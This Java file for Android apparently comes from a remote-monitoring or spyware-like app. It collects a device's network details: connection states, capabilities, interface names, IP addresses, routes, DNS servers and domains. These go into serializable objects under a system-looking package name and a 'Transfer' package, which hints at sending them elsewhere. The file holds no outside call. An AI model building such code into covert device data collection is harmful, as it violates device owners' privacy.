package Transfer;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.LinkProperties;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.os.Build.VERSION;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

import static android.net.NetworkCapabilities.NET_CAPABILITY_CBS;
import static android.net.NetworkCapabilities.NET_CAPABILITY_DUN;
import static android.net.NetworkCapabilities.NET_CAPABILITY_EIMS;
import static android.net.NetworkCapabilities.NET_CAPABILITY_FOTA;
import static android.net.NetworkCapabilities.NET_CAPABILITY_IA;
import static android.net.NetworkCapabilities.NET_CAPABILITY_IMS;
import static android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET;
import static android.net.NetworkCapabilities.NET_CAPABILITY_MMS;
import static android.net.NetworkCapabilities.NET_CAPABILITY_NOT_METERED;
import static android.net.NetworkCapabilities.NET_CAPABILITY_NOT_RESTRICTED;
import static android.net.NetworkCapabilities.NET_CAPABILITY_NOT_VPN;
import static android.net.NetworkCapabilities.NET_CAPABILITY_RCS;
import static android.net.NetworkCapabilities.NET_CAPABILITY_SUPL;
import static android.net.NetworkCapabilities.NET_CAPABILITY_TRUSTED;
import static android.net.NetworkCapabilities.NET_CAPABILITY_WIFI_P2P;
import static android.net.NetworkCapabilities.NET_CAPABILITY_XCAP;
import static android.net.NetworkCapabilities.TRANSPORT_BLUETOOTH;
import static android.net.NetworkCapabilities.TRANSPORT_CELLULAR;
import static android.net.NetworkCapabilities.TRANSPORT_ETHERNET;
import static android.net.NetworkCapabilities.TRANSPORT_VPN;
import static android.net.NetworkCapabilities.TRANSPORT_WIFI;

public class Connectivity implements Serializable {

  public boolean ISACTIVENETWORKMETERED;
  public boolean ISDEFAULTNETWORKACTIVE;
  public List<NetworkInfo> NETWORKINFO;
  public List<Networks> NETWORKS;

  public Connectivity() {
    NETWORKINFO = new ArrayList();
    NETWORKS = new ArrayList();

    ConnectivityManager connectivityManager =
        (ConnectivityManager) MyService.context.getSystemService(Context.CONNECTIVITY_SERVICE);

    android.net.NetworkInfo[] allNetworkInfo = connectivityManager.getAllNetworkInfo();
    int length = allNetworkInfo.length;
    int i2 = 0;
    while (i2 < length) {
      android.net.NetworkInfo networkInfo = allNetworkInfo[i2];
      try {
        NetworkInfo networkInfo2 = new NetworkInfo();
        if (networkInfo.getTypeName()
            .equals(connectivityManager.getActiveNetworkInfo().getTypeName())) {
          networkInfo2.ACTIVE = true;
        }

        networkInfo2.AVAILABLE = networkInfo.isAvailable();
        networkInfo2.EXTRA = networkInfo.getExtraInfo();
        networkInfo2.FAILOVER = networkInfo.isFailover();
        networkInfo2.REASON = networkInfo.getReason();

        if (VERSION.SDK_INT >= 3) {
          networkInfo2.ROAMING = networkInfo.isRoaming();
        }

        networkInfo2.STATE = networkInfo.getState() + "/" + networkInfo.getDetailedState();
        networkInfo2.TYPE = networkInfo.getTypeName();
        NETWORKINFO.add(networkInfo2);
        i2++;
      } catch (Exception e) {
        ExceptionAction.sendExceptionAction(e.getMessage());
        return;
      }
    }

    if (VERSION.SDK_INT >= 21) {
      Network[] allNetworks = connectivityManager.getAllNetworks();
      int length2 = allNetworks.length;
      int i = 0;
      while (i < length2) {
        Network network = allNetworks[i];
        Networks networks = new Networks();
        NetworkCapabilities networkCapabilities =
            connectivityManager.getNetworkCapabilities(network);
        networks.DOWNSTREAMBANDWITHKBPS = networkCapabilities.getLinkDownstreamBandwidthKbps();
        networks.UPSTREAMBANDWITHKBPS = networkCapabilities.getLinkUpstreamBandwidthKbps();

        if (networkCapabilities.hasCapability(NET_CAPABILITY_CBS)) {
          networks.CAPABILITIES += "CBS, ";
        }
        if (networkCapabilities.hasCapability(NET_CAPABILITY_DUN)) {
          networks.CAPABILITIES += "DUN, ";
        }
        if (networkCapabilities.hasCapability(NET_CAPABILITY_EIMS)) {
          networks.CAPABILITIES += "EIMS, ";
        }
        if (networkCapabilities.hasCapability(NET_CAPABILITY_FOTA)) {
          networks.CAPABILITIES += "FOTA, ";
        }
        if (networkCapabilities.hasCapability(NET_CAPABILITY_IA)) {
          networks.CAPABILITIES += "IA, ";
        }
        if (networkCapabilities.hasCapability(NET_CAPABILITY_IMS)) {
          networks.CAPABILITIES += "IMS, ";
        }
        if (networkCapabilities.hasCapability(NET_CAPABILITY_INTERNET)) {
          networks.CAPABILITIES += "INTERNET, ";
        }
        if (networkCapabilities.hasCapability(NET_CAPABILITY_MMS)) {
          networks.CAPABILITIES += "MMS, ";
        }
        if (networkCapabilities.hasCapability(NET_CAPABILITY_NOT_METERED)) {
          networks.CAPABILITIES += "NOT_METERED, ";
        }
        if (networkCapabilities.hasCapability(NET_CAPABILITY_NOT_RESTRICTED)) {
          networks.CAPABILITIES += "NOT_RESTRICTED, ";
        }
        if (networkCapabilities.hasCapability(NET_CAPABILITY_NOT_VPN)) {
          networks.CAPABILITIES += "NOT_VPN, ";
        }
        if (networkCapabilities.hasCapability(NET_CAPABILITY_RCS)) {
          networks.CAPABILITIES += "RCS, ";
        }
        if (networkCapabilities.hasCapability(NET_CAPABILITY_SUPL)) {
          networks.CAPABILITIES += "SUPL, ";
        }
        if (networkCapabilities.hasCapability(NET_CAPABILITY_TRUSTED)) {
          networks.CAPABILITIES += "TRUSTED, ";
        }
        if (networkCapabilities.hasCapability(NET_CAPABILITY_WIFI_P2P)) {
          networks.CAPABILITIES += "WIFI_P2P, ";
        }
        if (networkCapabilities.hasCapability(NET_CAPABILITY_XCAP)) {
          networks.CAPABILITIES += "XCAP, ";
        }
        if (networkCapabilities.hasTransport(TRANSPORT_BLUETOOTH)) {
          networks.TRANSPORTS += "BLUETOOTH, ";
        }
        if (networkCapabilities.hasTransport(TRANSPORT_CELLULAR)) {
          networks.TRANSPORTS += "CELLULAR, ";
        }
        if (networkCapabilities.hasTransport(TRANSPORT_ETHERNET)) {
          networks.TRANSPORTS += "ETHERNET, ";
        }
        if (networkCapabilities.hasTransport(TRANSPORT_VPN)) {
          networks.TRANSPORTS += "VPN, ";
        }
        if (networkCapabilities.hasTransport(TRANSPORT_WIFI)) {
          networks.TRANSPORTS += "WIFI, ";
        }

        if (networks.TRANSPORTS.endsWith(", ")) {
          networks.TRANSPORTS = networks.TRANSPORTS.substring(0, networks.TRANSPORTS.length() - 2);
        }

        if (networks.CAPABILITIES.endsWith(", ")) {
          networks.CAPABILITIES =
              networks.CAPABILITIES.substring(0, networks.CAPABILITIES.length() - 2);
        }

        LinkProperties linkProperties = connectivityManager.getLinkProperties(network);
        networks.INTERFACENAME = linkProperties.getInterfaceName();
        networks.LINKADDRESS = linkProperties.getLinkAddresses().toString();
        networks.ROUTES = linkProperties.getRoutes().toString();
        networks.DNSADDRESSES = linkProperties.getDnsServers().toString();
        networks.DOMAINS = linkProperties.getDomains();

        NETWORKS.add(networks);
        i++;
      }

      ISACTIVENETWORKMETERED = connectivityManager.isActiveNetworkMetered();
      ISDEFAULTNETWORKACTIVE = connectivityManager.isDefaultNetworkActive();
    }
  }
}
